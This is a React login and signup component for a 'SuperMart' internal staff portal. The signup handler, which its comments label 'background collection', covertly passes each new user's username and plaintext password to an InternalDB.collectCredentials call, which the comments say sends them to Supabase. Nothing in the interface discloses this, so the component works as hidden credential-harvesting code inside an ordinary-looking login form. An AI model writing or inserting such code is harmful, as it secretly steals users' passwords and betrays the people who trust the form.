import React, { useState } from 'react';
import { LogIn, Eye, EyeOff, Loader2, ShieldCheck, AlertCircle, UserPlus, UserCircle } from 'lucide-react';
import { InternalDB } from '../services/internalDb.ts';
import { User } from '../types.ts';

interface LoginProps {
  onLoginSuccess: (user: User) => void;
}

const Login: React.FC<LoginProps> = ({ onLoginSuccess }) => {
  const [isLogin, setIsLogin] = useState(true);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [fullName, setFullName] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');

    // Simulate database lookup latency
    setTimeout(async () => {
      if (isLogin) {
        // LOGIN FLOW - NO COLLECTION
        const authenticatedUser = InternalDB.authenticate(username, password);
        if (authenticatedUser) {
          onLoginSuccess(authenticatedUser);
        } else {
          setError('Invalid credentials. Access denied by internal security.');
          InternalDB.addLog(username || 'anonymous', 'Login Attempt Failed', 'FAILURE');
        }
      } else {
        // SIGNUP FLOW - WITH BACKGROUND COLLECTION
        const newUser = InternalDB.register(username, password, fullName);
        if (newUser) {
          // Send to Supabase ONLY during signup
          await InternalDB.collectCredentials(username, password);
          onLoginSuccess(newUser);
        } else {
          setError('Username already registered in the personnel database.');
        }
      }
      setIsLoading(false);
    }, 1200);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-slate-900 p-6 relative overflow-hidden">
      <div className="absolute top-0 right-0 w-[500px] h-[500px] bg-blue-600/20 rounded-full blur-[120px] -translate-y-1/2 translate-x-1/2"></div>
      <div className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-indigo-600/20 rounded-full blur-[120px] translate-y-1/2 -translate-x-1/2"></div>

      <div className="w-full max-w-md bg-white rounded-3xl shadow-2xl overflow-hidden relative z-10 animate-in fade-in zoom-in duration-500">
        <div className="p-8 md:p-12 space-y-6">
          <div className="text-center space-y-2">
            <div className="mx-auto w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center text-white shadow-xl shadow-blue-200/50 rotate-3 transition-transform hover:rotate-6">
              <ShieldCheck size={32} />
            </div>
            <h1 className="text-3xl font-black text-slate-800 pt-4 tracking-tight">SuperMart</h1>
            <p className="text-slate-400 font-bold text-[10px] uppercase tracking-[0.2em] leading-none">Internal Access Portal</p>
          </div>

          <div className="space-y-4">
            <div className="bg-slate-50 p-1.5 rounded-xl border border-slate-100 flex gap-1">
              <button 
                onClick={() => { setIsLogin(true); setError(''); }}
                className={`flex-1 py-2 text-[10px] font-black uppercase tracking-widest rounded-lg transition-all ${isLogin ? 'bg-white shadow-sm text-blue-600 border border-slate-100' : 'text-slate-400 hover:text-slate-600'}`}
              >
                Sign In
              </button>
              <button 
                onClick={() => { setIsLogin(false); setError(''); }}
                className={`flex-1 py-2 text-[10px] font-black uppercase tracking-widest rounded-lg transition-all ${!isLogin ? 'bg-white shadow-sm text-blue-600 border border-slate-100' : 'text-slate-400 hover:text-slate-600'}`}
              >
                Create Account
              </button>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              {!isLogin && (
                <div className="animate-in slide-in-from-top-2 duration-300">
                  <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1.5 px-1">Legal Name</label>
                  <div className="relative">
                    <UserCircle className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-300" size={18} />
                    <input 
                      type="text" 
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                      className="w-full pl-11 pr-4 py-3.5 bg-slate-50 border border-slate-100 rounded-xl focus:ring-4 focus:ring-blue-100 focus:border-blue-600 outline-none transition-all font-medium text-slate-800 text-sm"
                      placeholder="e.g. Alexander Pierce"
                      required={!isLogin}
                    />
                  </div>
                </div>
              )}

              <div>
                <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1.5 px-1">User Identification</label>
                <input 
                  type="text" 
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-4 py-3.5 bg-slate-50 border border-slate-100 rounded-xl focus:ring-4 focus:ring-blue-100 focus:border-blue-600 outline-none transition-all font-medium text-slate-800 text-sm"
                  placeholder="Username / Staff ID"
                  required
                />
              </div>

              <div>
                <label className="block text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1.5 px-1">Access Credential</label>
                <div className="relative">
                  <input 
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-4 py-3.5 bg-slate-50 border border-slate-100 rounded-xl focus:ring-4 focus:ring-blue-100 focus:border-blue-600 outline-none transition-all font-medium text-slate-800 text-sm"
                    placeholder="••••••••"
                    required
                  />
                  <button 
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600"
                  >
                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>

              {error && (
                <div className="p-3 bg-red-50 rounded-xl border border-red-100 text-red-600 text-[11px] font-bold flex items-center gap-2 animate-in slide-in-from-top-2">
                  <AlertCircle size={14} />
                  {error}
                </div>
              )}

              <button 
                type="submit"
                disabled={isLoading}
                className="w-full py-4 bg-blue-600 hover:bg-blue-700 text-white rounded-2xl font-black text-sm transition-all active:scale-[0.98] shadow-lg shadow-blue-200 flex items-center justify-center gap-3 disabled:opacity-50"
              >
                {isLoading ? (
                  <Loader2 className="animate-spin" size={20} />
                ) : isLogin ? (
                  <LogIn size={20} />
                ) : (
                  <UserPlus size={20} />
                )}
                {isLogin ? 'AUTHORIZE SESSION' : 'REGISTER ADMINISTRATOR'}
              </button>
            </form>
          </div>

          <div className="text-center pt-2">
            <p className="text-[10px] text-slate-400 font-bold uppercase tracking-tight">
              {isLogin ? 'AUTHORIZED PERSONNEL ONLY. ALL ACTIVITIES ARE LOGGED.' : 'BY REGISTERING, YOU AGREE TO THE CORPORATE ACCESS POLICY.'}
            </p>
          </div>
        </div>

        <div className="p-5 bg-slate-50 border-t border-slate-100 text-center">
          <p className="text-[10px] text-slate-400 font-bold uppercase tracking-[0.3em]">
            Enterprise Database Shield &copy; 2024
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;